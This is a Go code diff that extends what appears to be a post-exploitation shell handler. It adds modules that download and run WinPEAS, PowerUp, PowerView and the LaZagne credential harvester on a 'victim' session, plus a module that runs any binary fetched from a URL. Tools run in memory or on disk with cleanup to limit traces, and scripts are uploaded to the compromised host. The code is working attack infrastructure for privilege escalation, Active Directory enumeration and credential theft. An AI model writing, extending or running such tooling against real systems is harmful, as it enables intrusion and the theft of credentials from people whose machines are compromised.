@@ -31,7 +31,12 @@ func GetModuleRegistry() *ModuleRegistry {
 		globalRegistry.Register(&LSEModule{})
 		globalRegistry.Register(&LootModule{})
 		globalRegistry.Register(&PSPYModule{})
+		globalRegistry.Register(&WinPEASModule{})
+		globalRegistry.Register(&PowerUpModule{})
+		globalRegistry.Register(&PowerViewModule{})
+		globalRegistry.Register(&LaZagneModule{})
 		globalRegistry.Register(&PrivescModule{})
+		globalRegistry.Register(&BinaryModule{})
 		globalRegistry.Register(&ShellScriptModule{})
 		globalRegistry.Register(&PowerShellScriptModule{})
 		globalRegistry.Register(&DotNetAssemblyModule{})
@@ -190,7 +195,56 @@ func (m *LootModule) Run(ctx context.Context, session *SessionInfo, args []strin
 // Windows Modules
 // ============================================================================
 
-// (Future: WinPEAS, PowerUp, etc.)
+// WinPEASModule - WinPEAS privilege escalation scanner (.NET assembly, in-memory)
+type WinPEASModule struct{}
+
+func (m *WinPEASModule) Name() string          { return "winpeas" }
+func (m *WinPEASModule) Category() string      { return "windows" }
+func (m *WinPEASModule) Description() string   { return "Run WinPEAS privilege escalation scanner" }
+func (m *WinPEASModule) ExecutionMode() string { return "memory" }
+
+func (m *WinPEASModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	return session.RunDotNetInMemory(ctx, URL_WINPEAS, args)
+}
+
+// PowerUpModule - PowerUp privilege escalation checker (PowerShell, in-memory)
+type PowerUpModule struct{}
+
+func (m *PowerUpModule) Name() string          { return "powerup" }
+func (m *PowerUpModule) Category() string      { return "windows" }
+func (m *PowerUpModule) Description() string   { return "Run PowerUp privilege escalation checker" }
+func (m *PowerUpModule) ExecutionMode() string { return "memory" }
+
+func (m *PowerUpModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	return session.RunPowerShellInMemory(ctx, URL_POWERUP, args)
+}
+
+// PowerViewModule - PowerView AD enumeration (PowerShell, in-memory)
+type PowerViewModule struct{}
+
+func (m *PowerViewModule) Name() string          { return "powerview" }
+func (m *PowerViewModule) Category() string      { return "windows" }
+func (m *PowerViewModule) Description() string   { return "Load PowerView AD enumeration functions" }
+func (m *PowerViewModule) ExecutionMode() string { return "memory" }
+
+func (m *PowerViewModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	return session.RunPowerShellInMemory(ctx, URL_POWERVIEW, args)
+}
+
+// LaZagneModule - LaZagne credential harvester (native binary, disk + cleanup)
+type LaZagneModule struct{}
+
+func (m *LaZagneModule) Name() string          { return "lazagne" }
+func (m *LaZagneModule) Category() string      { return "windows" }
+func (m *LaZagneModule) Description() string   { return "Run LaZagne credential harvester" }
+func (m *LaZagneModule) ExecutionMode() string { return "disk-cleanup" }
+
+func (m *LaZagneModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		args = []string{"all"}
+	}
+	return session.RunBinary(ctx, URL_LAZAGNE, args)
+}
 
 // ============================================================================
 // Misc Modules
@@ -217,7 +271,7 @@ func (m *PrivescModule) Run(ctx context.Context, session *SessionInfo, args []st
 		scripts = linuxPrivescScripts // Default to Linux
 	}
 
-	// Upload each script using Transferer (handles download + upload with nice output)
+	// Upload each script using SmartUpload (HTTP if binbag enabled, b64 fallback)
 	for _, url := range scripts {
 		// Check for cancellation
 		if ctx.Err() == context.Canceled {
@@ -238,7 +292,7 @@ func (m *PrivescModule) Run(ctx context.Context, session *SessionInfo, args []st
 		// Upload to victim's CWD with original filename
 		t := NewTransferer(session.Conn, session.ID)
 		t.SetPlatform(session.Platform) // IMPORTANT: Set platform for correct upload method
-		if err := t.Upload(ctx, localPath, filename); err != nil {
+		if err := t.SmartUpload(ctx, localPath, filename); err != nil {
 			if ctx.Err() == context.Canceled {
 				return fmt.Errorf("cancelled by user")
 			}
@@ -257,6 +311,25 @@ func getFilenameFromURL(url string) string {
 		}
 	}
 	return url
+}
+
+// BinaryModule - Run arbitrary binary from URL or binbag (disk + cleanup)
+type BinaryModule struct{}
+
+func (m *BinaryModule) Name() string        { return "bin" }
+func (m *BinaryModule) Category() string    { return "misc" }
+func (m *BinaryModule) Description() string { return "Run arbitrary binary (disk + cleanup)" }
+func (m *BinaryModule) ExecutionMode() string { return "disk-cleanup" }
+
+func (m *BinaryModule) Run(ctx context.Context, session *SessionInfo, args []string) error {
+	if len(args) == 0 {
+		return fmt.Errorf("usage: run bin <url|filename> [binary args...]")
+	}
+
+	source := args[0]
+	binaryArgs := args[1:]
+
+	return session.RunBinary(ctx, source, binaryArgs)
 }
 
 // ============================================================================
